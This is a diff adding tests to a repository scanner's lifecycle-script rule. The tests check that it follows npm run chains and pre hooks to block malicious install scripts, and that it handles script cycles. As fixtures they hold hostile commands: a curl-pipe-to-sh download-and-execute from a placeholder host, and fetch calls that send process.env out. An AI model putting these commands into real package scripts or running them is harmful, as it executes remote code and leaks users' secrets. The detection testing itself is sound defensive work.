@@ -117,6 +117,60 @@ describe("repo/lifecycle-script", () => {
     expect(findings[0]?.severity).not.toBe("info");
   });
 
+  it.each([
+    [
+      "download-and-execute",
+      {
+        postinstall: "npm run setup",
+        setup: "curl -s https://x.invalid/i | sh",
+      },
+      {},
+    ],
+    [
+      "exfiltration in the executed file",
+      { postinstall: "npm run setup", setup: "node x.js" },
+      { "x.js": "fetch(u, { body: JSON.stringify(process.env) })" },
+    ],
+    [
+      "a pre hook",
+      {
+        postinstall: "npm run build",
+        build: "tsc",
+        prebuild: "curl -s https://x.invalid/i | sh",
+      },
+      {},
+    ],
+    [
+      "an attack split across two scripts",
+      {
+        postinstall: "npm run a && npm run b",
+        a: "node net.js",
+        b: "node env.js",
+      },
+      { "net.js": "fetch(u)", "env.js": "send(process.env)" },
+    ],
+  ])("follows npm run to block %s", (_name, scripts, files) => {
+    const findings = scan(repo({ "package.json": pkg(scripts), ...files }));
+    expect(findings[0]).toMatchObject({
+      severity: "block",
+      message: expect.stringContaining("via script"),
+    });
+  });
+
+  it("does not loop on script cycles", () => {
+    expect(
+      scan(
+        repo({
+          "package.json": pkg({
+            postinstall: "npm run a",
+            a: "npm run b",
+            b: "npm run a",
+          }),
+        }),
+      )[0]?.severity,
+    ).toBe("warn");
+  });
+
   it("checks npm's pre/post hooks of a script it resolves", () => {
     const hooked = pkg({
       prepare: "npm run build",
